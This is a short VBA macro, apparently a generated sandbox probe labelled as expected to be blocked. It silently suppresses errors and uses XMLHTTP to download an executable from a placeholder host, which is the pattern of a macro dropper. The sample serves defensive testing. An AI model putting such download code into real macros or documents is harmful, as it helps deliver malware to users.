' corpus-expect: blocked
' corpus-source: generated (sandbox probe)
' corpus-allow-files: yes
' corpus-flagged: yes
Sub Main()
    On Error Resume Next
    Dim h As Object
    Set h = CreateObject("MSXML2.XMLHTTP")
    h.Open "GET", "http://example.invalid/a.exe", False
    h.Send
End Sub
